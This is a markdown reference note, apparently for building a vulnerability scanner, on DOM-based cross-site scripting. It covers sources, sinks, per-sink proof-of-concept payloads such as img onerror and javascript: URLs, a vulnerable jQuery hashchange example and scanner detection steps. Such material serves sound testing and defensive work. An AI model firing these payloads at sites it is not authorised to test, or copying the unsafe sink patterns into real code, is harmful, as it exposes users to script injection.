---
tags: xss, dom, dom-xss, source, sink, javascript, client-side, tier1, tier2
category: xss
---

# DOM XSS — Sources, Sinks, and Exploitation

## Why DOM XSS is different

The server never reflects the payload. Client-side JavaScript reads attacker-controlled
data and writes it to the DOM unsafely.

```javascript
// Server response contains NO payload
// But JavaScript does this:
let q = new URLSearchParams(location.search).get('q');
document.write('<h1>Results: ' + q + '</h1>');
// URL: ?q=<img src=x onerror=alert(1)>
// -> alert fires entirely client-side
```

## Sources (where attacker input enters)

| Source | Example | Input Vector |
|--------|---------|--------------|
| `location.search` | `?q=payload` | URL query string |
| `location.hash` | `#payload` | URL fragment |
| `location.href` | Full URL | URL |
| `document.URL` | Full URL | URL |
| `document.referrer` | Referrer header | Referrer |
| `window.name` | Window name | Window name |
| `URLSearchParams.get()` | `params.get('q')` | URL query |
| `decodeURIComponent()` | Decoded URL part | URL |
| `postMessage` data | Cross-origin messages | Message |
| Cookie values | `document.cookie` | Cookie |
| `localStorage` / `sessionStorage` | Stored data | Storage |

## Sinks (where data causes execution)

| Sink | Severity | Payload type |
|------|----------|--------------|
| `innerHTML` | Critical | HTML: `<img src=x onerror=alert(1)>` |
| `outerHTML` | Critical | HTML tags |
| `document.write()` | Critical | HTML tags |
| `document.writeln()` | Critical | HTML tags |
| `eval()` | Critical | JS: `alert(1)` |
| `Function()` | Critical | JS: `alert(1)` |
| `setTimeout(str)` | High | JS string |
| `setInterval(str)` | High | JS string |
| `jQuery $()` | High | HTML: `<img src=x onerror=alert(1)>` |
| `jQuery .html()` | High | HTML tags |
| `insertAdjacentHTML()` | High | HTML tags |
| `element.href = ` | High | `javascript:alert(1)` |
| `element.src = ` | High | URL / `javascript:` |
| `location.assign()` | High | `javascript:alert(1)` |
| `location.replace()` | High | `javascript:alert(1)` |

## Payloads by sink type

### document.write / innerHTML / outerHTML
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>alert(1)</script>
```

### eval() / Function() / setTimeout(str)
```
alert(1)
1;alert(1)
```

### jQuery $()
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### href / src / assign / replace
```
javascript:alert(1)
```

## hash-based DOM XSS (hashchange event)

```javascript
$(window).on('hashchange', function(){
    var post = $('section h2:contains(' +
        decodeURIComponent(window.location.hash.slice(1)) + ')');
});

// Source: location.hash
// Sink:   jQuery $()
// Payload: #<img src=x onerror=alert(1)>
// Test URL: https://target.com/#<img src=x onerror=alert(1)>
```

Key insight: `#` prefix means this never hits the server — purely client-side.
The scanner must inject via the URL fragment and trigger the hashchange event.

## Scanner detection steps

1. Fetch page and all linked JS files
2. Parse JS for source patterns (location.search, location.hash, etc.)
3. Find sink patterns (innerHTML, document.write, eval, jQuery $(), etc.)
4. Find source->sink data flow within ±8 lines
5. Identify payload type from sink
6. Build test URL:
   - `?param=payload` for query-based sources
   - `#payload` for hash-based sources
7. Browser validation: load URL, check DOM changed / event fired

